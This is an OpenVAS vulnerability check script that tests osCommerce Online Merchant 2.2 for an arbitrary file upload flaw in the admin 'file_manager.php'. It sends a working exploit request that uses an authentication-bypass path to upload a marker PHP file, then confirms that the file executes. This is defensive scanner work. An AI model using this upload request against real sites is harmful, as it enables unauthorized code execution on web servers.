###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_oscommerce_40456.nasl 14 2013-10-27 12:33:37Z jan $
#
# osCommerce Online Merchant 'file_manager.php' Remote Arbitrary File Upload Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2010 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_summary = "Online Merchant module for osCommerce is prone to a remote arbitrary-file-
upload vulnerability because it fails to sufficiently sanitize user-
supplied input.

Attackers can exploit this issue to upload arbitrary code and run
it in the context of the webserver process. This may facilitate
unauthorized access or privilege escalation; other attacks are
also possible.

Online Merchant 2.2 is vulnerable; other versions may also be
affected.";

tag_solution = "Delete the file 'file_manager.php' in your 'admin' directory.";

desc = "
 Summary:
 " + tag_summary + "
 Solution:
 " + tag_solution;

if (description)
{
 script_xref(name : "URL" , value : "http://www.securityfocus.com/bid/40456");
 script_xref(name : "URL" , value : "http://www.oscommerce.com");
 script_id(100661);
 script_version("$Revision: 14 $");
 script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:33:37 +0100 (Sun, 27 Oct 2013) $");
 script_tag(name:"creation_date", value:"2010-06-01 17:39:02 +0200 (Tue, 01 Jun 2010)");
 script_bugtraq_id(40456);
 script_tag(name:"cvss_base", value:"4.6");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:H/Au:S/C:P/I:P/A:P");

 script_name("osCommerce Online Merchant 'file_manager.php' Remote Arbitrary File Upload Vulnerability");

 script_tag(name:"risk_factor", value:"Medium");
 script_description(desc);
 script_summary("Determine if osCommerce is prone to a remote arbitrary-file-upload vulnerability");
 script_category(ACT_ATTACK);
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2010 Greenbone Networks GmbH");
 script_dependencies("oscommerce_detect.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
   script_tag(name : "solution" , value : tag_solution);
   script_tag(name : "summary" , value : tag_summary);
 }
 exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("version_func.inc");

port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);
 
if(!dir = get_dir_from_kb(port:port,app:"oscommerce"))exit(0);
rand = rand();

file = string("OpenVAS_TEST_DELETE_ME_", rand, ".php");   
exp = string("filename=",file,"&file_contents=%3C%3F+echo+%22OpenVAS-Upload-Test%22%3B%3F%3E&submit=+++Save+++");

req = string(  
        "POST ", dir, "/admin/file_manager.php/login.php?action=save HTTP/1.1\r\n",
        "Content-Type: application/x-www-form-urlencoded\n",
        "Host: ", get_host_name(), "\r\n",
        "Content-Length: ", strlen(exp), "\r\n",
        "Connection: close\r\n\r\n",
         exp); 

recv = http_keepalive_send_recv(data:req, port:port, bodyonly:TRUE);

req2 = http_get(item:string(dir, "/", file), port:port);
recv2 = http_keepalive_send_recv(data:req2, port:port, bodyonly:TRUE);
  
if (recv2 == NULL) exit(0);
if("OpenVAS-Upload-Test" >< recv2) {

  report = string( 
        desc, "\n\n",
        "Note :\n\n",
        "## It was possible to upload and execute a file on the remote webserver.\n",
        "## The file is placed in directory: ", '"', dir, '"', "\n",
        "## and is named: ", '"', file, '"', "\n\n",
        "## You should delete this file as soon as possible!\n");    

  security_hole(port:port, data:report);
  exit(0);
}
 
exit(0);
